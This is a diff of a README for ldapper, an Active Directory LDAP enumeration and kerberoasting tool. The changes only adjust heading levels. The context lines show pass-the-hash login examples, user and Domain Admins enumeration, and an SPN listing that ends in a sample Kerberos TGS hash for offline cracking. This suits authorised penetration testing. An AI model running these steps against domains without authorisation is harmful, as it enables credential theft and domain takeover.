@@ -22,7 +22,7 @@ Add/Remove Arbitrary SPNs
 Kerberoast
 This tool should be considered in its beta stages. Please report any bugs, issues, or functionality ideas for future releases.
 
-### Installation
+## Installation
 
 ```plain
 git clone https://github.com/Synzack/ldapper
@@ -30,13 +30,13 @@ go mod tidy
 go build
 ```
 
-### Usage
+## Usage
 
 ```plain
 ./ldapper [OPTIONS]
 ```
 
-### Flags
+## Flags
 
 ```plain
   -H string
@@ -62,14 +62,14 @@ Examples:
         With Hash:      ./ldapper -u <username@domain> -H <hash> -dc <ip/FQDN> -s
 ```
 
-### Examples
+## Examples
 
-#### Setting up connection
+### Setting up connection
 
 * Username/password authentication: `./ldapper -dc 10.0.0.20 -u crypt0rr@offsec.nl -p Welkom1234`
 * NTLM Authentication: `./ldapper -dc 10.0.0.20 -u crypt0rr@offsec.nl -H 97f2592347d8fbe42be381726ff9ea83`
 
-#### Starting LDAP-shell session running 'net user'
+### Starting LDAP-shell session running 'net user'
 
 ```plain
 > net user administrator
@@ -91,14 +91,14 @@ Mail:
 SPN(s): 
 ```
 
-#### Retrieve ms-DS-MachineAccountQuota
+### Retrieve ms-DS-MachineAccountQuota
 
 ```plain
 > mquota
 Machine Account Quota: 10
 ```
 
-#### Checking password policy
+### Checking password policy
 
 ```plain
 > passpol
@@ -114,7 +114,7 @@ Maximum Password Age:           42      day(s)
 Password Complexity:            DOMAIN_PASSWORD_COMPLEX
 ```
 
-#### Retrieve group members 'net group'
+### Retrieve group members 'net group'
 
 ```plain
 > net group Domain Admins
@@ -136,7 +136,7 @@ crypt0rr        KIMBERLEY_CONTRERAS     LORENE_CLINE
 1060184468SA
 ```
 
-#### Get list of SPNs and perform kerberoasting
+### Get list of SPNs and perform kerberoasting
 
 ```plain
 > getspns
@@ -158,6 +158,6 @@ ftp/GOOWLPT1000001      ABE_MASON               2022-07-04 15:23:37 +0200 CEST  
 $krb5tgs$23$*HAL_MURRAY$OFFSEC.NL$HAL_MURRAY*$0d2768f9c9cb33b22e338cd4e732f3dd$6e47d8cb3701126a966d0c7697b[...]091b8b73a9a1dba92d661a
 ```
 
-### URL list
+## URL List
 
 * [Github.com - ldapper](https://github.com/Synzack/ldapper)
